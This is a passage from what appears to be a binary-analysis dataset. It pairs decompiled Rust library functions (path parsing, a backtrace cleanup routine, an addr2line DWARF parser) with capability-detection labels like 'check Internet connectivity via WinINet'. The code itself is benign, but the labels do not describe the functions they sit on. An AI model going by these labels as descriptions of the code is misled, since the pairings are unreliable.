arg1, noname_3, CONCAT17(uVar9, in_stack_ffffffffffffffb8), \n                                        unaff_RBX, unaff_RBP, unaff_RDI);\n            noname_3 = noname_3 & 0xffffffff;\n            if (cVar3 != '\\0') {\n                if (arg2[1] != NULL) {\n                    *arg2 = *arg2 + 1;\n                    arg2[1] = arg2[1] + -1;\n                    *arg1 = 2;\n                    return;\n                }\n                goto code_r0x0041e5a9;\n            }\n        }\n        goto code_r0x0041e245;\n    }\n    arg2_00 = arg2[1];\n    if (arg2_00 != NULL) {\n        pcVar2 = *arg2;\n        ppcVar6 = NULL;\n        if (uVar1 < 3) {\n            do {\n                if (pcVar2[ppcVar6] == '\\\\') goto code_r0x0041e38f;\n                ppcVar6 = ppcVar6 + 1;\n            } while (arg2_00 != ppcVar6);\n        }\n        else {\n            do {\n                if ((pcVar2[ppcVar6] == '/') || (pcVar2[ppcVar6] == '\\\\')) goto code_r0x0041e38f;\n                ppcVar6 = ppcVar6 + 1;\n            } while (arg2_00 != ppcVar6);\n        }\n        arg1_00 = NULL;\n        ppcVar6 = arg2_00;\n        if (arg2_00 != NULL) goto code_r0x0041e399;\n        goto code_r0x0041e371;\n    }\n    *(arg2 + 0x39) = 3;\n    goto code_r0x0041e43e;\ncode_r0x0041e38f:\n    arg1_00 = 0x1;\n    if (ppcVar6 == NULL) {\ncode_r0x0041e371:\n        if (arg2_00 < arg1_00) goto code_r0x0041e5a2;\n        *arg2 = pcVar2 + arg1_00;\n        arg2[1] = arg2_00 - arg1_00;\n        uVar8 = 2;\n        goto code_r0x0041e245;\n    }\ncode_r0x0041e399:\n    pcVar4 = pcVar2;\n    iVar5 = (2 < uVar1) * 3 + 2;\n    if (ppcVar6 == 0x1) {\ncode_r0x0041e3c0:\n        if (*pcVar4 != '.') {\n            iVar5 = 4;\n        }\n    }\n    else {\n        iVar5 = 4;\n        if ((ppcVar6 == 0x2) && (*pcVar2 == '.')) {\n            pcVar4 = pcVar2 + 1;\n            iVar5 = 3;\n            goto code_r0x0041e3c0;\n        }\n    }\n    arg1_00 = arg1_00 + ppcVar6;\n    if (arg2_00 < arg1_00) {\ncode_r0x0041e5a2:\n        dbg.slice_start_index_len_fail(arg1_00, arg2_00);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    *arg2 = arg1_00 + pcVar2;\n    arg2[1] = arg2_00 - arg1_00;\n    uVar8 = 2;\n    if (iVar5 != 5) {\n        *arg1 = iVar5;\n        arg1[1] = pcVar2;\n        arg1[2] = ppcVar6;\n        return;\n    }\ncode_r0x0041e245:\n    if (uVar9 < uVar8) goto code_r0x0041e43e;\n    goto code_r0x0041e24e;\n}\n",
        "token_count": 1624
    },
    "5c5b995d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_std::backtrace_rs::symbolize::gimli::Library_::h5c5b995d539423fb(ulong *arg1)\n\n{\n    // core::ptr::drop_in_place<std::backtrace_rs::symbolize::gimli::Library>::h5c5b995d539423fb\n    if (arg1[1] != 0) {\n        sym.__rust_dealloc(*arg1, 1);\n    }\n    if ((arg1[4] != 0) && ((arg1[4] & 0xfffffffffffffff) != 0)) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg1[3]);\n        return;\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "054f3fbb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_1h_2\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.addr2line::ResDwarf_R_::parse::h054f3fbbdd4029c3(ulong *arg1, uint64_t ********arg2)\n\n{\n    uint16_t *puVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint64_t *puVar4;\n    uint *puVar5;\n    uint8_t uVar6;\n    uint64_t ********ppppppppuVar7;\n    uchar auVar8 [16];\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uchar (*pauVar17) [16];\n    bool bVar18;\n    char cVar19;\n    uint64_t ********ppppppppuVar20;\n    ulong *puVar21;\n    uint64_t ******ppppppuVar22;\n    int32_t iVar23;\n    uint32_t uVar24;\n    uint32_t *puVar25;\n    uint64_t ********ppppppppuVar26;\n    uint16_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    int64_t iVar30;\n    uint64_t uVar31;\n    int64_t iVar32;\n    uint64_t ******ppppppuVar33;\n    uint64_t *******pppppppuVar34;\n    ulong uVar35;\n    uint16_t uVar36;\n    int64_t iVar37;\n    uchar (*pauVar38) [16];\n    uchar (*pauVar39) [16];\n    uint64_t ********ppppppppuVar40;\n    uint64_t ********ppppppppuVar41;\n    uint64_t *******pppppppuVar42;\n    uint64_t uVar43;\n    uint64_t *******pppppppuVar44;\n    uint64_t uVar45;\n    uint64_t ********ppppppppuVar46;\n    uint8_t *puVar47;\n    uint8_t *puVar48;\n    uint8_t *puVar49;\n    uint64_t ********ppppppppuVar50;\n    int16_t iVar51;\n    uint32_t uVar52;\n    uint64_t ********unaff_RDI;\n    uint64_t ********ppppppppuVar53;\n    uint64_t ********ppppppppuVar54;\n    uint8_t uVar55;\n    int16_t iVar56;\n    uint32_t uVar57;\n    uint64_t *******pppppppuVar58;\n    uint64_t *******pppppppuVar59;\n    int64_t iVar60;\n    uint64_t *******pppppppuVar61;\n    uint64_t *******pppppppuVar62;\n    ushort uVar63;\n    uint64_t ********ppppppppuVar64;\n    uint32_t uVar65;\n    uint32_t uVar66;\n    uint64_t ********ppppppppuVar67;\n    ulong *puVar68;\n    uint64_t uVar69;\n    uint64_t *******pppppppuVar70;\n    bool bVar71;\n    uint uVar72;\n    uint32_t uVar73;\n    uint uVar74;\n    uint32_t uVar75;\n    uint uVar76;\n    uint32_t uVar77;\n    uint uVar78;\n    uint32_t uVar79;\n    uint uVar80;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_c8h;\n    uint8_t uStack2097;\n    uint64_t ********ppppppppuStack2096;\n    char cStack2081;\n    uint64_t *******pppppppuStack2080;\n    uint64_t *******pppppppuStack2072;\n    uint64_t ********ppppppppuStack2064;\n    uint64_t ********ppppppppuStack2056;\n    uint64_t ********ppppppppuStack2048;\n    uint64_t *******pppppppuStack2040;\n    uint64_t ********ppppppppuStack2032;\n    uint64_t *******pppppppuStack2024;\n    uint64_t *******pppppppuStack2016;\n    uint64_t ********ppppppppuStack2008;\n    uchar uStack1996;\n    char cStack1995;\n    uchar uStack1994;\n    char cStack1993;\n    ulong uStack1992;\n    uchar auStack1984 [8];\n    ulong uStack1976;\n    uint64_t *******pppppppuStack1968;\n    uint64_t ********ppppppppuStack1960;\n    uint64_t *******pppppppuStack1952;\n    uint64_t ********ppppppppuStack1944;\n    uint64_t ********ppppppppuStack1936;\n    uint64_t ********ppppppppuStack1928;\n    uint64_t ********ppppppppuStack1920;\n    ulong uStack1912;\n    uchar auStack1904 [8];\n    uint64_t ********ppppppppuStack1896;\n    uint64_t *******pppppppuStack1888;\n    uint64_t *******pppppppuStack1880;\n    uint64_t *******pppppppuStack1872;\n    ulong *puStack1864;\n    uint64_t ********ppppppppuStack1856;\n    uint64_t ********ppppppppuStack1848;\n    uchar auStack1840 [8];\n    ulong uStack1832;\n    int16_t iStack1824;\n    ushort uStack1822;\n    uint32_t uStack1820;\n    ulong uStack1816;\n    ulong uStack1808;\n    uint32_t uStack1800;\n    uint32_t uStack1796;\n    uint64_t ********ppppppppuStack1792;\n    uint64_t ********ppppppppuStack1784;\n    uint64_t ********ppppppppuStack1776;\n    uint64_t *******pppppppuStack1768;\n    uint64_t *******pppppppuStack1760;\n    uint64_t *******pppppppuStack1752;\n    ushort uStack1738;\n    ulong uStack1736;\n    uchar auStack1728 [8];\n    ulong uStack1720;\n    ulong uStack1712;\n    uint64_t ********ppppppppuStack1704;\n    uint64_t ********ppppppppuStack1696;\n    uchar auStack1688 [8];\n    ulong uStack1680;\n    uchar auStack1672 [8];\n    ulong uStack1664;\n    uint64_t ********ppppppppuStack1656;\n    uint64_t ********ppppppppuStack1648;\n    uint64_t ********ppppppppuStack1640;\n    uint64_t ********ppppppppuStack1632;\n    uint64_t ********ppppppppuStack1624;\n    uint64_t ********ppppppppuStack1616;\n    uint64_t *******pppppppuStack1608;\n    uint64_t uStack1600;\n    int64_t iStack1592;\n    uint64_t ********ppppppppuStack1584;\n    uint64_t *******pppppppuStack1576;\n    ulong uStack1568;\n    uchar auStack1560 [8];\n    uint64_t *******pppppppuStack1552;\n    uint uStack1544;\n    ushort uStack1540;\n    uint64_t *******pppppppuStack1536;\n    uint64_t *******pppppppuStack1528;\n    uint64_t ********ppppppppuStack1520;\n    uint64_t ********ppppppppuStack1512;\n    uint64_t ********ppppppppuStack1504;\n    uint uStack1496;\n    uint32_t uStack1492;\n    int64_t iStack1488;\n    uchar auStack1480 [16];\n    ulong uStack1464;\n    uchar auStack1456 [8];\n    ulong uStack1448;\n    ulong uStack1440;\n    uchar auStack1432 [8];\n    ulong uStack1424;\n    ulong uStack1416;\n    uchar uStack1408;\n    uchar uStack1407;\n    uint16_t uStack1406;\n    uint32_t uStack1404;\n    uint uStack1400;\n    uint32_t uStack1396;\n    ulong uStack1392;\n    ulong uStack1384;\n    ulong uStack1376;\n    ulong uStack1368;\n    ulong uStack1360;\n    ulong uStack1352;\n    ulong uStack1344;\n    ulong uStack1336;\n    uint64_t ********ppppppppuStack1328;\n    uint64_t ********ppppppppuStack1320;\n    int16_t iStack1312;\n    uint8_t uStack1310;\n    uchar uStack1309;\n    uint32_t uStack1308;\n    uint uStack1304;\n    uint uStack1300;\n    uint uStack1296;\n    uint uStack1292;\n    uint64_t ********ppppppppuStack1288;\n    uint64_t ********ppppppppuStack1280;\n    uint64_t ******ppppppuStack1272;\n    uint64_t ********ppppppppuStack1264;\n    uint64_t ********ppppppppuStack1256;\n    int64_t iStack1248;\n    uint64_t *******pppppppuStack1240;\n    int64_t iStack1232;\n    int64_t iStack1224;\n    uint64_t ********ppppppppuStack1216;\n    uint64_t ********ppppppppuStack1208;\n    uint64_t *******pppppppuStack1200;\n    ulong *puStack1192;\n    uint64_t ********ppppppppuStack1184;\n    uint uStack1176;\n    uint uStack1172;\n    uint uStack1168;\n    uint uStack1164;\n    ulong uStack1160;\n    uint uStack1152;\n    uint uStack1148;\n    uint uStack1144;\n    uint uStack1140;\n    ulong uStack1136;\n    uint uStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    ulong uStack1112;\n    uint uStack1104;\n    uint uStack1100;\n    uint uStack1096;\n    uint uStack1092;\n    ulong uStack1088;\n    uint64_t *******pppppppuStack1080;\n    int64_t iStack1072;\n    uint64_t ******ppppppuStack1064;\n    uint64_t ********ppppppppuStack1056;\n    ulong uStack1048;\n    uint64_t ********ppppppppuStack1040;\n    uint64_t ********ppppppppuStack1032;\n    uint64_t ********ppppppppuStack1024;\n    ulong uStack1016;\n    uint uStack1008;\n    uint uStack1004;\n    uint uStack1000;\n    uint uStack996;\n    uint64_t ********ppppppppuStack992;\n    uchar uStack984;\n    uint8_t uStack983;\n    ushort uStack982;\n    char cStack980;\n    char cStack979;\n    uchar uStack978;\n    uchar uStack977;\n    char cStack976;\n    uchar uStack975;\n    uint uStack974;\n    ushort uStack970;\n    uint64_t uStack968;\n    uint64_t ********ppppppppuStack960;\n    ulong uStack944;\n    ulong uStack904;\n    ushort uStack864;\n    ushort uStack862;\n    uint64_t ********ppppppppuStack856;\n    uint64_t *******pppppppuStack848;\n    uint64_t uStack840;\n    uint64_t uStack832;\n    uint64_t *******pppppppuStack824;\n    uint uStack814;\n    ushort uStack810;\n    uint64_t *******pppppppuStack808;\n    uint64_t ********ppppppppuStack800;\n    int64_t iStack792;\n    int64_t iStack784;\n    uint uStack776;\n    uint uStack772;\n    uint uStack768;\n    uint uStack764;\n    ulong uStack760;\n    uint uStack744;\n    uint uStack740;\n    uint uStack736;\n    uint uStack732;\n    ulong uStack728;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uint uStack700;\n    ulong uStack696;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    ulong uStack664;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint64_t ********ppppppppuStack616;\n    uint64_t ********ppppppppuStack608;\n    uint64_t ********appppppppuStack600 [5];\n    uint64_t ********ppppppppuStack560;\n    int64_t iStack552;\n    uint uStack544;\n    int64_t aiStack536 [2];\n    uint64_t uStack520;\n    int64_t iStack512;\n    int64_t iStack504;\n    uint64_t ********ppppppppuStack456;\n    uint64_t ********ppppppppuStack440;\n    uint64_t *******pppppppuStack424;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint32_t uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ulong var_10h_2;\n    ulong var_1h_2;\n    \n    // addr2line::ResDwarf<R>::parse::h054f3fbbdd4029c3\n    ppppppppuStack1520 = 0x8;\n    uVar72 = 0;\n    uVar74 = 0;\n    uVar76 = 0;\n    uVar78 = 0;\n    ppppppppuStack1512 = NULL;\n    ppppppppuStack1504 = NULL;\n    pppppppuStack808 = arg2[6];\n    ppppppppuStack800 = arg2[7];\n    iStack792 = 0;\n    puStack1864 = arg1;\n    ppppppppuStack1776 = arg2;\n    if (ppppppppuStack800 != NULL) {\n        ppppppppuVar67 = 0x8;\n        iVar37 = 0;\n        ppppppppuVar41 = ppppppppuStack800;\n        do {\n            ppppppppuStack2056 = ppppppppuStack1504;\n            dbg.parse<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>\n                      (&uStack1416, &pppppppuStack808, iVar37);\n            unaff_RDI = ppppppppuStack800;\n            ppppppppuVar53 = uStack1392;\n            if (CONCAT44(uStack1416._4_4_, uStack1416) != 0) {\n                *(puStack1864 + 1) = CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408));\n                *(puStack1864 + 0xc) = uStack1404;\n                *(puStack1864 + 2) = uStack1400;\n                *(puStack1864 + 0x14) = uStack1396;\n                *puStack1864 = 1;\n                goto code_r0x00429728;\n            }\n            iVar37 = ppppppppuVar41 + (iStack792 - ppppppppuStack800);\n            iStack792 = iVar37;\n            if (uStack1368._1_1_ == '\\x03') break;\n            pppppppuVar70 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n            if (ppppppppuStack2056 == ppppppppuStack1512) {\n                dbg.reserve_for_push<(gimli::common::DebugInfoOffset<usize>, gimli::common::DebugArangesOffset<usize>), alloc::alloc::Global>\n                          (&ppppppppuStack1520, ppppppppuStack2056);\n                ppppppppuStack2056 = ppppppppuStack1504;\n                ppppppppuVar67 = ppppppppuStack1520;\n            }\n            ppppppppuVar67[ppppppppuStack2056 * 2] = ppppppppuVar53;\n            ppppppppuVar67[ppppppppuStack2056 * 2 + 1] = pppppppuVar70;\n            ppppppppuStack2056 = ppppppppuStack2056 + 1;\n            ppppppppuVar41 = unaff_RDI;\n            ppppppppuStack1504 = ppppppppuStack2056;\n        } while (unaff_RDI != NULL);\n        ppppppppuVar67 = ppppppppuStack1520;\n        ppppppppuVar41 = ppppppppuStack2056;\n        if (ppppppppuStack2056 < 0x15) {\n            if ((0x1 < ppppppppuStack2056) && (ppppppppuStack2056 + -1 != 0)) {\n                iVar30 = 0;\n                iVar37 = ppppppppuStack2056 + -1;\n                do {\n                    iVar60 = iVar37 + -1;\n                    pppppppuVar70 = ppppppppuStack1520[iVar60 * 2];\n                    if (ppppppppuStack1520[iVar37 * 2] < pppppppuVar70) {\n                        pauVar38 = ppppppppuStack1520 + iVar37 * 2;\n                        pppppppuVar44 = ppppppppuStack1520[iVar60 * 2 + 1];\n                        *(ppppppppuStack1520 + iVar60 * 2) = *pauVar38;\n                        if ((2 < ppppppppuStack2056 - iVar60) &&\n                           (iVar37 = iVar30,  *(ppppppppuStack1520 + iVar60 * 2)[2] < pppppppuVar70)) {\n                            do {\n                                iVar32 = iVar37;\n                                *(ppppppppuStack1520 + iVar32 + ppppppppuStack2056 * 0x10 + -0x10) =\n                                     *(ppppppppuStack1520 + iVar32 + ppppppppuStack2056 * 0x10);\n                                if (iVar32 + 0x10 == 0) break;\n                                iVar37 = iVar32 + 0x10;\n                            } while (*(ppppppppuStack1520 + iVar32 + ppppppppuStack2056 * 0x10 + 0x10) < pppppppuVar70);\n                            pauVar38 = ppppppppuStack1520 + iVar32 + ppppppppuStack2056 * 0x10;\n                        }\n                        **pauVar38 = pppppppuVar70;\n                        *(*pauVar38 + 8) = pppppppuVar44;\n                    }\n                    iVar30 = iVar30 + -0x10;\n                    unaff_RDI = ppppppppuStack1520;\n                    iVar37 = iVar60;\n                } while (iVar60 != 0);\n            }\n        }\n        else {\n            ppppppppuStack608 = ppppppppuStack2056 >> 1;\n            iVar37 = SUB168(ZEXT816(ppppppppuStack608) * ZEXT816(0x10), 0);\n            bVar71 = SUB168(ZEXT816(ppppppppuStack608) * ZEXT816(0x10) >> 0x40, 0) != 0;\n            if (bVar71) {\n                sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n                goto code_r0x00429a87;\n            }\n            ppppppppuVar53 = !bVar71;\n            ppppppppuStack1936 = ppppppppuVar53 << 3;\n            if (iVar37 != 0) {\n                ppppppppuStack1936 = sym.__rust_alloc(iVar37, ppppppppuStack1936);\n                ppppppppuVar53 = ppppppppuStack1936;\n            }\n            if (ppppppppuVar53 == NULL) {\n                dbg.handle_alloc_error(iVar37);\n                goto code_r0x00429a87;\n            }\n            appppppppuStack600[0] = NULL;\n            uStack1416._0_4_ = 8;\n            uStack1416._4_4_ = 0;\n            uStack1408 = 0;\n            uStack1407 = 0;\n            uStack1406 = 0;\n            uStack1404 = 0;\n            uStack1400 = 0;\n            uStack1396 = 0;\n            ppppppppuStack1960 = ppppppppuVar67 + -6;\n            ppppppppuStack1928 = ppppppppuVar67 + -2;\n            ppppppppuStack1696 = ppppppppuVar67 + 2;\n            ppppppppuVar53 = 0x8;\n            ppppppppuVar64 = NULL;\n            ppppppppuVar46 = ppppppppuVar41;\n            ppppppppuStack616 = ppppppppuStack1936;\n            do {\n                ppppppppuVar26 = ppppppppuVar46 - 1;\n                if (ppppppppuVar26 == NULL) {\n                    unaff_RDI = 0x1;\n                    ppppppppuVar50 = NULL;\n                }\n                else {\n                    pppppppuVar70 = ppppppppuVar67[ppppppppuVar46 * 2 + -4];\n                    if (ppppppppuVar67[ppppppppuVar26 * 2] < pppppppuVar70) {\n                        ppppppppuVar20 = ppppppppuStack1960 + ppppppppuVar46 * 2;\n                        ppppppppuVar50 = ppppppppuVar26;\n                        do {\n                            if (ppppppppuVar50 == 0x1) {\n                                ppppppppuVar50 = NULL;\n                                break;\n                            }\n                            pppppppuVar44 = *ppppppppuVar20;\n                            ppppppppuVar50 = ppppppppuVar50 - 1;\n                            ppppppppuVar20 = ppppppppuVar20 + -2;\n                            bVar71 = pppppppuVar70 < pppppppuVar44;\n                            pppppppuVar70 = pppppppuVar44;\n                        } while (bVar71);\n                        unaff_RDI = ppppppppuVar46 - ppppppppuVar50;\n                        if (ppppppppuVar46 < ppppppppuVar50) {\n                            dbg.slice_index_order_fail(ppppppppuVar50, ppppppppuVar46);\n                            goto code_r0x00429a87;\n                        }\n                        if (ppppppppuVar41 < ppppppppuVar46) {\n                            dbg.slice_end_index_len_fail(ppppppppuVar46, ppppppppuVar41);\n                            goto code_r0x00429a87;\n                        }\n                        if (0x1 < unaff_RDI) {\n                            if (unaff_RDI >> 1 == 1) {\n                                uVar45 = 0;\n                            }\n                            else {\n                                ppppppppuVar20 = ppppppppuStack1928 + ppppppppuVar46 * 2;\n                                pauVar38 = ppppppppuStack1696 + ppppppppuVar50 * 2;\n                                uVar45 = 0;\n                                do {\n                                    uVar80 = *pauVar38[-1];\n                                    uVar9 = *(pauVar38[-1] + 4);\n                                    uVar10 = *(pauVar38[-1] + 8);\n                                    uVar11 = *(pauVar38[-1] + 0xc);\n                                    uVar12 = *(ppppppppuVar20 + 4);\n                                    uVar13 = *(ppppppppuVar20 + 1);\n                                    uVar14 = *(ppppppppuVar20 + 0xc);\n                                    *pauVar38[-1] = *ppppppppuVar20;\n                                    *(pauVar38[-1] + 4) = uVar12;\n                                    *(pauVar38[-1] + 8) = uVar13;\n                                    *(pauVar38[-1] + 0xc) = uVar14;\n                                    *ppppppppuVar20 = uVar80;\n                                    *(ppppppppuVar20 + 4) = uVar9;\n                                    *(ppppppppuVar20 + 1) = uVar10;\n                                    *(ppppppppuVar20 + 0xc) = uVar11;\n                                    uVar45 = uVar45 + 2;\n                                    auVar8 = *pauVar38;\n                                    uVar80 = *(ppppppppuVar20 + -0xc);\n                                    uVar9 = *(ppppppppuVar20 + -1);\n                                    uVar10 = *(ppppppppuVar20 + -4);\n                                    **pauVar38 = *(ppppppppuVar20 + -2);\n                                    *(*pauVar38 + 4) = uVar80;\n                                    *(*pauVar38 + 8) = uVar9;\n                                    *(*pauVar38 + 0xc) = uVar10;\n                                    *(ppppppppuVar20 + -2) = auVar8;\n                                    ppppppppuVar20 = ppppppppuVar20 + -4;\n                                    pauVar38 = pauVar38[2];\n                                } while ((unaff_RDI >> 1 & 0xfffffffffffffffe) != uVar45);\n                            }\n                            if ((unaff_RDI & 2) != 0) {\n                                auVar8 = *(ppppppppuVar67 + ppppppppuVar50 * 2 + uVar45 * 2);\n                                ppppppppuVar20 = ppppppppuVar67 + ppppppppuVar46 * 2 + ~uVar45 * 2;\n                                uVar80 = *(ppppppppuVar20 + 4);\n                                uVar9 = *(ppppppppuVar20 + 1);\n                                uVar10 = *(ppppppppuVar20 + 0xc);\n                                ppppppppuVar40 = ppppppppuVar67 + ppppppppuVar50 * 2 + uVar45 * 2;\n                                *ppppppppuVar40 = *ppppppppuVar20;\n                                *(ppppppppuVar40 + 4) = uVar80;\n                                *(ppppppppuVar40 + 1) = uVar9;\n                                *(ppppppppuVar40 + 0xc) = uVar10;\n                                *(ppppppppuVar67 + ppppppppuVar46 * 2 + ~uVar45 * 2) = auVar8;\n                            }\n                        }\n                    }\n                    else {\n                        ppppppppuVar50 = ppppppppuStack1960 + ppppppppuVar46 * 2;\n                        iVar37 = 0;\n                        do {\n                            iVar30 = iVar37;\n                            if (ppppppppuVar46 + -2 == iVar30) {\n                                ppppppppuVar50 = NULL;\n                                unaff_RDI = ppppppppuVar46;\n                                goto joined_r0x004251ed;\n                            }\n                            pppppppuVar44 = *ppppppppuVar50;\n                            ppppppppuVar50 = ppppppppuVar50 + -2;\n                            bVar71 = pppppppuVar44 <= pppppppuVar70;\n                            pppppppuVar70 = pppppppuVar44;\n                            iVar37 = iVar30 + 1;\n                        } while (bVar71);\n                        ppppppppuVar50 = ppppppppuVar26 - (iVar30 + 1);\n                        unaff_RDI = iVar30 + 2;\n                    }\n                    if ((ppppppppuVar50 != NULL) && (unaff_RDI < 0xa)) {\n                        if (ppppppppuVar41 < ppppppppuVar46) {\n                            ppppppppuVar50 = ppppppppuVar50 - 1;\n                            if (ppppppppuVar46 < ppppppppuVar50) {\ncode_r0x0042980b:\n                                dbg.slice_index_order_fail(ppppppppuVar50, ppppppppuVar46);\n                            }\n                            else {\n                                dbg.slice_end_index_len_fail(ppppppppuVar46, ppppppppuStack2056);\n                            }\n                            goto code_r0x00429a87;\n                        }\n                        pauVar38 = ppppppppuStack1696 + ppppppppuVar50 * 2;\n                        ppppppppuVar20 = ppppppppuVar50;\n                        do {\n                            ppppppppuVar50 = ppppppppuVar20 - 1;\n                            unaff_RDI = ppppppppuVar46 - ppppppppuVar50;\n                            if (ppppppppuVar46 < ppppppppuVar50) goto code_r0x0042980b;\n                            if (0x1 < unaff_RDI) {\n                                pauVar17 = ppppppppuVar67 + ppppppppuVar50 * 2;\n                                pppppppuVar70 = **pauVar17;\n                                if (ppppppppuVar67[ppppppppuVar20 * 2] < pppppppuVar70) {\n                                    pauVar39 = ppppppppuVar67 + ppppppppuVar20 * 2;\n                                    pppppppuVar44 = ppppppppuVar67[ppppppppuVar50 * 2 + 1];\n                                    *pauVar17 = *pauVar39;\n                                    if (0x2 < unaff_RDI) {\n                                        pppppppuVar61 = *pauVar17[2];\n                                        ppppppppuVar40 = ppppppppuVar26;\n                                        pauVar17 = pauVar38;\n                                        while (pppppppuVar61 < pppppppuVar70) {\n                                            pauVar17[-1] = *pauVar17;\n                                            ppppppppuVar40 = ppppppppuVar40 - 1;\n                                            pauVar39 = pauVar17;\n                                            if (ppppppppuVar20 == ppppppppuVar40) break;\n                                            pppppppuVar61 = *pauVar17[1];\n                                            pauVar17 = pauVar17[1];\n                                        }\n                                    }\n                                    **pauVar39 = pppppppuVar70;\n                                    *(*pauVar39 + 8) = pppppppuVar44;\n                                }\n                            }\n                        } while ((ppppppppuVar50 != NULL) &&\n                                (pauVar38 = pauVar38[-1],  ppppppppuVar20 = ppppppppuVar50,  unaff_RDI < 0xa));\n                    }\n                }\njoined_r0x004251ed:\n                if (ppppppppuVar64 == CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)))) {\n                    dbg.reserve_for_push<(gimli::common::DebugInfoOffset<usize>, gimli::common::DebugArangesOffset<usize>), alloc::alloc::Global>\n                              (&uStack1416, ppppppppuVar64);\n                    ppppppppuVar53 = CONCAT44(uStack1416._4_4_, uStack1416);\n                    ppppppppuVar64 = CONCAT44(uStack1396, uStack1400);\n                }\n                ppppppppuVar53[ppppppppuVar64 * 2] = ppppppppuVar50;\n                ppppppppuVar53[ppppppppuVar64 * 2 + 1] = unaff_RDI;\n                ppppppppuVar64 = ppppppppuVar64 + 1;\n                uStack1400 = ppppppppuVar64;\n                uStack1396 = ppppppppuVar64 >> 0x20;\n                ppppppppuStack1920 = ppppppppuVar53;\n                ppppppppuStack1856 = ppppppppuVar50;\n                if (0x1 < ppppppppuVar64) {\n                    do {\n                        ppppppppuVar46 = ppppppppuVar64 + -1;\n                        if (ppppppppuVar53[ppppppppuVar46 * 2] == NULL) {\ncode_r0x004254d0:\n                            if (0x2 < ppppppppuVar64) {\n                                pppppppuVar44 = ppppppppuVar53[ppppppppuVar46 * 2 + 1];\n                                pppppppuVar61 = ppppppppuVar53[(ppppppppuVar64 + -3) * 2 + 1];\n                                goto code_r0x004254f3;\n                            }\ncode_r0x004254f8:\n                            ppppppppuVar26 = ppppppppuVar64 + -2;\n                        }\n                        else {\n                            pppppppuVar70 = ppppppppuVar53[ppppppppuVar64 * 2 + -3];\n                            pppppppuVar44 = ppppppppuVar53[ppppppppuVar46 * 2 + 1];\n                            if (pppppppuVar70 <= pppppppuVar44) goto code_r0x004254d0;\n                            if (ppppppppuVar64 < 0x3) {\n                                ppppppppuVar64 = 0x2;\n                                goto code_r0x004250e5;\n                            }\n                            pppppppuVar61 = ppppppppuVar53[(ppppppppuVar64 + -3) * 2 + 1];\n                            if (pppppppuVar44 + pppppppuVar70 < pppppppuVar61) {\n                                if (ppppppppuVar64 < 0x4) {\n                                    ppppppppuVar64 = 0x3;\n                                    goto code_r0x004250e5;\n                                }\n                                if (pppppppuVar70 + pppppppuVar61 <= ppppppppuVar53[ppppppppuVar64 * 2 + -7] &&\n                                    ppppppppuVar53[ppppppppuVar64 * 2 + -7] != pppppppuVar70 + pppppppuVar61)\n                                goto code_r0x004250e5;\n                            }\ncode_r0x004254f3:\n                            ppppppppuVar26 = ppppppppuVar64 + -3;\n                            if (pppppppuVar44 <= pppppppuVar61) goto code_r0x004254f8;\n                        }\n                        ppppppppuVar50 = ppppppppuVar26 + 1;\n                        if (ppppppppuVar64 <= ppppppppuVar50) {\n                            dbg.panic_bounds_check(ppppppppuVar50, ppppppppuVar64, 0x4499c8);\n                            goto code_r0x00429a87;\n                        }\n                        if (ppppppppuVar64 <= ppppppppuVar26) {\n                            dbg.panic_bounds_check(ppppppppuVar26, ppppppppuVar64, 0x4499e0);\n                            goto code_r0x00429a87;\n                        }\n                        unaff_RDI = ppppppppuVar53[ppppppppuVar50 * 2];\n                        ppppppppuVar20 = ppppppppuVar53[ppppppppuVar26 * 2 + 1];\n                        ppppppppuVar40 = ppppppppuVar53[ppppppppuVar26 * 2] + ppppppppuVar20;\n                        if (ppppppppuVar40 < unaff_RDI) {\n                            dbg.slice_index_order_fail(unaff_RDI, ppppppppuVar40);\n                            goto code_r0x00429a87;\n                        }\n                        ppppppppuStack2048 = ppppppppuVar64;\n                        if (ppppppppuVar41 < ppppppppuVar40) {\n                            dbg.slice_end_index_len_fail(ppppppppuVar40, ppppppppuStack2056);\n                            goto code_r0x00429a87;\n                        }\n                        pppppppuVar70 = (ppppppppuVar53 + 1)[ppppppppuVar50 * 2];\n                        ppppppppuStack2064 = ppppppppuVar53 + ppppppppuVar26 * 2;\n                        ppppppppuStack2032 = ppppppppuVar53 + ppppppppuVar26 * 2 + 